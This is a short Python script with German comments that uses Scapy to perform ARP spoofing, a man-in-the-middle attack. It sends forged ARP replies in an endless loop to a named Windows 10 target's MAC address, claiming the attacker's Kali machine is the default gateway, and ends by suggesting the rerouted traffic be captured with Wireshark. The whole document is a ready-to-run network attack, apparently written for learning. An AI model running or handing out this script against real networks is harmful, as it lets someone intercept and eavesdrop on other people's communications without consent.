#!/usr/bin/python3

# Skript für Kali Linux Use (geht auch unter Windows)
# Man in the Middle Skript sorgt dafür dass
# Kommunikation über mein Kali Linux geroutet wird.
# Sonst passiert jedoch weiter nichts
from scapy.all import *

# ACHTUNG: MAC Adresse wie folgt angeben -> "08:00:27:ab:08:1c"
# src = Eigene Ethernetadresse als MAC Adresse;     Linux:>> ifconfig -a   Windows:>> ipconfig
src = "08:00:27:ab:08:1c" # Angreifer / Kali Linux

# Destination (dst) = MAC Adresse des Angriffsziels
dst = "2C:F0:5D:D1:9F:A9" # Win 10


IP_Standardgateway = "192.168.0.1" # Standardgateway-IP -> Linux:>> route -n
IP_reroute = src # IP Adresse zu der umgeroutet werden soll (Unser Kali Linux)

# ARP-Paket in Etherpaket über "/" einbinden
paket = Ether(src = src, dst = dst) / ARP(op = "is-at", psrc = IP_Standardgateway, hwsrc = IP_reroute) # ARP Paket -> Operation Modi: Fragen welche MAC Adresse hat Standardgateway über  "is-at"

print("Paketinfo:")
print(paket) # Paket welches wir zusammengebaut haben
print("\n")
paket.show()

sendp(paket, loop = 1 ,inter= 0.5) # Scapy Befehl für Versenden eines Lvl 2 Paketes. Siehe ISO OSI Modell
# Loop = 1 unbegrenze Wiederholung; Intervallfrequenz in Sekunden

# Jetzt könnte ab hier z.B. mit Wireshark mitgeschnitten werden